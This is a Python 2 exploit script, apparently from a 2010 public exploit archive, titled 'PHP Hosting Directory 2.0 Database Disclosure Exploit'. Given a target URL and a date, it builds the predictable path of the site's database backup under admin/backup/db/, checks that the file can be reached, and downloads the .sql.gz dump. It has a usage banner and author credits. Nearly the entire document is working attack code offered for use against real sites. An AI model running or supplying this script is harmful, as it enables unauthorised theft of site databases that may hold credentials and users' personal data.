#!/usr/bin/env python

#-*- coding:cp1254 -*-



'''

# Title        : PHP Hosting Directory 2.0 Database Disclosure Exploit (.py)

# Author       : ZoRLu / http://inj3ct0r.com/author/577

# mail-msn     : admin@yildirimordulari.com

# Down. Script : -

# Proof        : http://img214.imageshack.us/img214/2407/directory.jpg

# Tested       : Windows XP Professional sp3

# Home         : http://z0rlu.blogspot.com

# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org

# Date         : 16/10/2010

# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N

# Lakirdi      : off ulan off / http://www.youtube.com/watch?v=mIdwAz7-cHk

'''



import sys, urllib2, re, os, time



def indiriyoruz(url):



    import urllib

    aldosyayi = urllib.urlopen(url)

    indiraq = open(url.split('/')[-1], 'wb')

    indiraq.write(aldosyayi.read())

    aldosyayi.close()

    indiraq.close()



if len(sys.argv) < 3:

                    import os

                    os.system(['clear','cls'][1])

                    os.system('color 2')

                    print "_______________________________________________________________"

                    print "                                                               "

                    print " PHP Hosting Directory 2.0 Database Disclosure Exploit (.py)   "

                    print "                                                               "

                    print " coded by ZoRLu                                                "

                    print "                                                               "

                    print ' usage: %s http://server.com/path/ day-mounth-year' % os.path.basename(sys.argv[0])

		    print "                                                               "

                    print " example day-mounth-year for today:                            "

		    print "                                                               "

                    print " today: 16-10-2010                                             "

                    print "                                                               "

                    print "_______________________________________________________________"

                    sys.exit("\nexample: http://www.server.com/ 16-10-2010")





''' link kontrol 1 '''



add = "http://"

add2 = "/"

sitemiz = sys.argv[1]



if sitemiz[-1:] != add2:

    print "\nnwhere is  it: " + add2

    print "okk I will add"

    time.sleep(2)

    sitemiz += add2

    print "its ok" + " " + sitemiz



if sitemiz[:7]  != add:

    print "\nwhere is it: " + add

    print "okk I will add"

    time.sleep(2)

    sitemiz =  add + sitemiz

    print "its ok" + " " + sitemiz



db = "admin/backup/db/backup_db_"

tarih = sys.argv[2]

uzanti = ".sql.gz"

url2 = sitemiz + db + tarih + uzanti



''' link kontrol 2 '''



try:

    adreskontrol = urllib2.urlopen(url2).read()



    if len(adreskontrol) > 0:



        print "\nGood Job Bro!"



except urllib2.HTTPError:

        import os

        import sys

        print "\nForbidden Sorry! Server has a Security!"

        sys.exit(1)





''' dosya indiriliyor '''



if __name__ == '__main__':

    import sys

    if len(sys.argv) == 3:

        print "\nFile is Downloading\n"

        try:

            indiriyoruz(url2)

        except IOError:

            print '\nFilename not found.'